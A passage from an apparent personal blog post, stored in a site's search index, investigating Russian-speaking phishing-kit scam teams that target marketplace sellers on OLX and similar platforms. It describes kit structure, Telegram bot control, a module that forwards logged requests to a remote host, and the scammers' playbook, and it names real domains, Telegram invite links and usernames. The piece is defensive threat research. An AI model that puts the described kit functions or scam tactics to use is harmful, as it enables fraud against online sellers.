showed how this file connected to the rest of VirusTotal’s database. To my surprise, it revealed a lot of ZIP files.\n![[Pasted image 20241128003916.png]]\nI even found one tailored specifically for the Bulgarian platform: OLX BG.zip. I downloaded a few samples to explore their contents and discovered that these ZIP files contained the entire scam projects! Apparently, there isn’t much trust among the scammers, as there were so many results available.\nNext, I wanted to understand what these projects were and how they related to the ongoing scam I was experiencing. So, I proceeded to download some of the samples, focusing on getting the most recent ones.\nBefore examining the systems, I looked for other similar websites to identify additional domains. One very useful feature of the website urlscan.io is its ability to find structurally similar websites that have been scanned through it. By checking the original sample I had and exploring the related pages, I discovered many domains that looked similar:\n![[Pasted image 20241217111442.png]]\nIf we check some of the websites, we find:\n![[72f3a826-dc59-4020-9541-9ee79e3e9576.png]]\nWhich is extremely similar to the one we already have. Now, let’s begin by examining how these systems operate.\nExamining the systems Now, returning to the Relations tab of the SVG file, I downloaded couple of ZIP files.\n![[Pasted image 20241216231545.png]]\nOne of them, named eb09ee4f032eaefd5374f1b55a0fcee8b1f8f77739739cc9160a9e2aa4b00fcf, contained a folder titled \u0026ldquo;swarovsky (скрипт скам тимы по площадкам),\u0026rdquo; which translates to \u0026ldquo;Swarovsky (scam team\u0026rsquo;s script for platforms).\u0026rdquo;\nNow, a quick look at the system.\nThe system appears to be a complete phishing solution integrated with a Telegram bot that can perform various functions, such as:\n Creating Bitcoin wallets Sending SMS/Receiving SMS Generating Numbers (through various services) Adding or deleting domains from a pool of phishing domains  Additionally, I noticed the author of the system was listed in the author attribute of the package.json file.\n\u0026#34;name\u0026#34;: \u0026#34;zerorent\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;2.0.0\u0026#34;, ... \u0026#34;author\u0026#34;: \u0026#34;t.me/zerorent\u0026#34;, In the config.json we have some interesting attributes such as \u0026ldquo;teamInfo\u0026rdquo; with the this information:\n\u0026#34;teamInfo\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;SVAROVSKY\u0026#34;, \u0026#34;admin_username\u0026#34;: \u0026#34;halloset\u0026#34;, \u0026#34;chat_link\u0026#34;: \u0026#34;https://t.me/+qXQ4DjC1mpIwODIy\u0026#34;, \u0026#34;profits_channel\u0026#34;: \u0026#34;https://t.me/+76MdR782BHk4NzNi\u0026#34; } I\u0026rsquo;ve actually went my way to find other ZIPs and the others were for some other teams such as:\n\u0026#34;teamInfo\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;DD Team\u0026#34;, \u0026#34;admin_username\u0026#34;: \u0026#34;pitbull_dev\u0026#34;, \u0026#34;chat_link\u0026#34;: \u0026#34;https://t.me/+W9cVKpb2G9UyNzdi\u0026#34;, \u0026#34;profits_channel\u0026#34;: \u0026#34;https://t.me/+pEIFN3rNpbdhZjcy\u0026#34; } So apparently this system is being sold to a different \u0026ldquo;Teams\u0026rdquo;, more on that later.\nI also noticed that there is some nginx configuration that are containing different domains for each server, for example:\neu-zr73gs.site olx.eu-zr73gs.site mbway.eu-zr73gs.site ...  Full list of domains will be in the artifacts below the article!\n To sum it up, this is a Node.js system that hosts both a web module with some web APIs and a Telegram bot.\nI also explored other systems. The \u0026ldquo;ScamBotTg-main.zip\u0026rdquo; file stood out as particularly interesting because it contained numerous ZIP files, each seemingly tailored for different marketplace websites, such as:\nMode LastWriteTime Length Name ---- ------------- ------ ---- ------ 4/30/2022 6:37 AM 395107 ALLERGO.zip ------ 4/30/2022 6:37 AM 92168 Alpha.zip ------ 4/30/2022 6:37 AM 200695 AUTO.RU .zip ------ 4/30/2022 6:37 AM 188942 AVITO RENT.zip ------ 4/30/2022 6:37 AM 590225 avito.zip ------ 4/30/2022 6:37 AM 404599 Bazos.zip ------ 4/30/2022 6:37 AM 1479906 Belpost.zip ------ 4/30/2022 6:37 AM 1344061 BlaBlaCar.zip ------ 4/30/2022 6:37 AM 60557 Boxberry.zip ------ 4/30/2022 6:37 AM 104168 Cdek.zip ------ 4/30/2022 6:37 AM 30558 Dostavista.zip ------ 4/30/2022 6:37 AM 1796004 Europost.zip ------ 4/30/2022 6:37 AM 1582886 FanCourier.zip ------ 4/30/2022 6:37 AM 1236207 Fargo.zip ------ 4/30/2022 6:37 AM 382696 IZI.zip ------ 4/30/2022 6:37 AM 1199455 Kazpost.zip ------ 4/30/2022 6:37 AM 577890 Kufar.zip ------ 4/30/2022 6:37 AM 883170 MVIDEO.zip ------ 4/30/2022 6:37 AM 222145 O YANDEX.zip ------ 4/30/2022 6:37 AM 265066 OLX BG.zip ------ 4/30/2022 6:37 AM 378568 OLX KZ RENT.zip ------ 4/30/2022 6:37 AM 437208 OLX KZ.zip ------ 4/30/2022 6:37 AM 623993 OLX PL.zip ------ 4/30/2022 6:37 AM 1507238 OLX RO.zip ------ 4/30/2022 6:37 AM 276784 OLX UA.zip ------ 4/30/2022 6:37 AM 1318365 PECOM.zip ------ 4/30/2022 6:37 AM 30873 POCHTA.zip ------ 4/30/2022 6:37 AM 139 README.md ------ 4/30/2022 6:37 AM 247882 SBAZAR.zip ------ 4/30/2022 6:37 AM 129725 Sberbank.zip ------ 4/30/2022 6:37 AM 837544 Yandex.zip ------ 4/30/2022 6:37 AM 193872 YOULA RENT.zip ------ 4/30/2022 6:37 AM 595278 Youla.zip ------ 4/30/2022 6:37 AM 13526272 Тинька бот.zip And there’s also a README.md file. The naming convention of the file suggests that it was likely downloaded from GitHub or a similar repository.\nThe README:\n# ScamBotTg Скамим ребятушек по Европе и СНГ через телеграм-бота и веб-часть на PHP Meaning:\nWe're scamming kids across Europe and the CIS via a Telegram bot and a web part on PHP. I understand the European part, but as you can see in the files, there are Russian-specific markets as well. CIS refers to countries like Russia, Belarus, Kazakhstan, Moldova, etc. As far as I know and understand the Russian cyberspace, hackers typically don’t cross the \u0026ldquo;redline\u0026rdquo; that is the CIS. However, these individuals aren’t hackers, are they? :)\nNow, let’s take a look at what’s inside the OLX BG.zip file.\nMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 11/20/2020 8:13 PM assets d----- 11/20/2020 8:13 PM cgi-bin d----- 11/20/2020 8:13 PM img -a---- 10/27/2020 12:09 AM 302 .htaccess -a---- 10/27/2020 12:09 AM 51 3ds.php -a---- 10/27/2020 12:09 AM 51 buy.php -a---- 10/27/2020 12:09 AM 52 cash.php -a---- 10/27/2020 12:09 AM 4158 favicon.ico -a---- 10/27/2020 12:09 AM 43 index.php -a---- 10/27/2020 12:09 AM 83 logo.php -a---- 10/27/2020 12:09 AM 9673 logo.png -a---- 10/27/2020 12:09 AM 56 merchant.php -a---- 10/27/2020 12:09 AM 53 order.php -a---- 10/27/2020 12:09 AM 54 refund.php -a---- 10/27/2020 12:09 AM 25 robots.txt -a---- 10/27/2020 12:09 AM 54 unlock.php -a---- 10/27/2020 12:09 AM 56 _delivery.php -a---- 11/22/2020 12:02 PM 1292 _set.php This one wasn’t interesting at all. It wasn’t connected to the app I was dealing with, as I noticed files that weren’t present in the assets I had. It was a completely different system. Essentially, it logged all POST/GET requests and sent them to sh1327157.a.had.su/_remote.php. The same behaviour is applied to every system included in the ZIP files. The remote domains also changed with each ZIP I examined.\nNow, I noticed that 13526272 Тинька бот.zip is the largest file in the collection, so let’s check that one out.\nMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/6/2021 7:10 AM bin d----- 2/6/2021 7:10 AM cards d----- 12/7/2020 7:23 PM cars d----- 8/9/2020 5:47 PM cgi-bin d----- 12/11/2020 2:49 AM checks d----- 2/5/2021 8:57 PM domains d----- 12/11/2020 2:48 AM edited d----- 11/7/2020 3:16 PM fonts d----- 11/7/2020 3:16 PM foredit d----- 2/5/2021 10:08 PM functions d----- 11/7/2020 3:16 PM images d----- 2/6/2021 6:36 AM items d----- 6/10/2020 6:57 AM keys d----- 10/2/2020 9:55 AM logs d----- 10/12/2020 11:54 AM mails d----- 2/5/2021 9:38 PM pages d----- 8/13/2020 5:27 PM pay.libs d----- 2/6/2021 7:10 AM pays d----- 12/11/2020 2:48 AM qrcode d----- 12/11/2020 2:50 AM rendering d----- 12/7/2020 7:24 PM rent d----- 11/27/2020 11:50 PM scripts d----- 2/5/2021 10:13 PM settings d----- 12/11/2020 3:09 AM stats d----- 11/29/2020 5:36 PM styles d----- 11/7/2020 3:16 PM temp d----- 12/11/2020 2:48 AM tracks d----- 2/5/2021 10:02 PM users d----- 11/7/2020 3:16 PM vendor -a---- 11/28/2020 7:15 PM 302 .htaccess -a---- 11/20/2020 2:43 PM 219 alert.php -a---- 10/5/2020 12:02 AM 5532 asd.php -a---- 11/22/2020 3:38 PM 831 cleaner.php -a---- 10/2/2020 4:00 PM 1454 data.php -a---- 8/9/2020 5:47 PM 3132 index.html -a---- 6/20/2020 11:54 AM 48 index.php -a---- 6/19/2020 9:46 AM 25 robots.txt -a---- 2/5/2021 9:31 PM 312 services.json -a---- 2/5/2021 10:18 PM 338043 tinkoff.php -a---- 2/6/2021 6:37 AM 5151 XML_daily.asp -a---- 2/6/2021 7:34 AM 4614 _config.php -a---- 8/14/2020 4:50 PM 2492 _mail.php -a---- 11/17/2020 7:42 AM 1672 _recvsmsPL_shb.php -a---- 10/24/2020 2:17 PM 1670 _recvsms_shb.php -a---- 2/5/2021 9:44 PM 158385 _remote.php -a---- 10/23/2020 7:58 AM 940 _sendsms_clk.php -a---- 2/5/2021 10:45 PM 59664 _set.php There are a lot of interesting elements in _config.php, including functional email addresses registered in the US with fake phone numbers. There are also Telegram channels used for reporting various activities, such as chatProfits, chatAlerts, chatCard, linkScreen, and others. These contain Telegram Bot URLs and credentials.\nAdditionally, there are files used to send SMS for \u0026ldquo;verification\u0026rdquo; purposes, leveraging services like smshub.org and clickatell.com. The system also includes proxies with usernames and passwords. I noticed they heavily use .txt files as their \u0026ldquo;database,\u0026rdquo; which is good for me since these files were scattered throughout the directory. This includes a domains.txt file listing various domains. Another interesting feature is a Telegram bot that seems to act as a \u0026ldquo;proxy,\u0026rdquo; duplicating the functionality of the control panel file.\nOverall, this system appears to be modular, with the ZIP files serving as individual modules for the main system.\nThe first few samples didn’t tell me much, so I went ahead and downloaded over 100 similar systems to get a better picture. I wanted to gather as many Indicators of Compromise (IOCs) as possible, so I wrote some automation scripts to extract the contents and scan for things like URLs, credentials, Telegram groups, Telegraph articles, and secrets. By the end of it, I had some massive lists of indicators to dig into further.\nSince I found a ton of Telegram bot API keys, I decided to create a Telegram bot checker. My goal was to see which bots were still active and, hopefully, uncover more information about the people running them. This gave me a better understanding of how these systems work and who might be behind them. It resulted in a few active bots that were currently operating.\nI found multiple chats and groups, which I exported and ran through ChatGPT to better understand what they were talking about. Looking back, it might seem a bit excessive, but it helped me uncover a lot of groups that can be reported. So, let’s take a closer look:\nWho are those people? In summary, I have identified individuals who are either from Russia or Russian-speaking. I have uncovered more than 10,000 people involved in these types of scams. These individuals are scamming people across Europe and beyond. I found evidence of their activities in countries such as Germany, Spain, Italy, the Czech Republic, Romania, Bulgaria, and more.\nThe organization of these individuals operates within teams. Each team consists of multiple sub-teams, and every team has a \u0026ldquo;Вбивер.\u0026rdquo; According to minsknews.by , a \u0026ldquo;Вбивер\u0026rdquo; is described as a person who, \u0026ldquo;having access to card details, uses them for their own purposes: stealing money from the account or purchasing goods, services, and other items.\u0026rdquo;\nHowever, I don’t think this is the case. Since I can see multiple \u0026ldquo;workers\u0026rdquo; connected to the same \u0026ldquo;Вбивер,\u0026rdquo; I assume this refers more to the \u0026ldquo;system\u0026rdquo; they are using rather than a single individual.\nExample given:\n![[Pasted image 20241218093108.png]]\nAs you can see the \u0026ldquo;Вбивер\u0026rdquo; is the same but the workers are different people. Some of the people having \u0026ldquo;Наставник\u0026rdquo; (Mentor) which I assume that those people are in a testing period.\nNow I was a bit lost, since I haven\u0026rsquo;t found anything about Bulgaria so far, one interesting thing however caught my attention and that is the tutorials that they are sharing are always exclusively on \u0026ldquo;telegra.ph,\u0026rdquo; this is an anonymous publishing platform by Telegram that lets anyone post stories without having to register an account.\nThey have multiple articles for various of things:\n How to use VPNs How to use the platforms that they are scamming (e.g.. OLX) Various platforms for getting phone numbers and setting WhatsApp/Viber Accounts  And I noticed that the titles are simply a slug followed by the date, I\u0026rsquo;ve seen some manuals for OLX and the URLs are typically like:\nManual-po-SUBITO-20-03-06 Rumyniya-OLX-20-03-06 So I thought that maybe with a bit of brute forcing we can find some articles, thankfully someone thought of that already.\nTelegcrack does exactly that, so I set out to uncover some names. Eventually, I came across a manual for scamming on OLX Bulgaria. It contained information on how to set up tools like \u0026ldquo;Bluestacks,\u0026rdquo; an Android emulator for running Viber, obtaining phone numbers from \u0026ldquo;onlinesim.io,\u0026rdquo; and a brief overview of the Bulgarian marketplaces where scammers target victims.\nThe listed marketplaces included:\n bazar.bg olx.bg alo.bg Facebook groups  The tutorial also advised focusing on large items such as \u0026ldquo;washing machines, fridges, pianos\u0026rdquo; to make the scam appear more credible. At the beginning of this article, I mentioned that the item I was selling was large, and it turns out I was right to suspect something.\nWanting to dig deeper, I discovered bots though some were no longer active. However, through other sources, I found active scam bots available for rent to scammers. One example is \u0026ldquo;AsyncRent,\u0026rdquo; (not to be mistaken with AsyncRAT) which operates in Bulgaria via OLX and Econt, along with a tutorial I managed to find. I even identified the individuals \u0026ldquo;developing\u0026rdquo; these bots. But now what?\nI shifted my focus to those using the bots. To my surprise (not really looking back), I uncovered a group of kids sharing memes and making their scam victims take photos or perform other humiliating acts. At this point, I decided to end my investigation.\nConclusion I did all this hunting simply because I hate scammers, and I hate that I found a \u0026ldquo;culture\u0026rdquo; that builds scammers and believes that doing something like that is \u0026ldquo;work.\u0026rdquo; One can only speculate how those massive groups are still operating out in the open with their real names and profile pictures.\nSo\u0026hellip; what’s next? Nothing, really. I don\u0026rsquo;t think Telegram cares enough to do anything and even if they do, they will resurface again within days or even hours and will continue to operate. The best we can do is highlight the scams.\nIf you\u0026rsquo;ve made it this far into the article, it means a lot to me, and I thank you!\n", 
        "url": "https:\/\/sy1.sh\/posts\/2024-19-12-investigation-on-scams\/"
    },
    
    "https:\/\/sy1.sh\/categories\/": {
        "title": "Categories",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/categories\/"
    },
    
}
</script>
<script defer src="/js/lunr.js"></script>
<script defer src="/js/search.js"></script>

</footer>

</body>
</html>

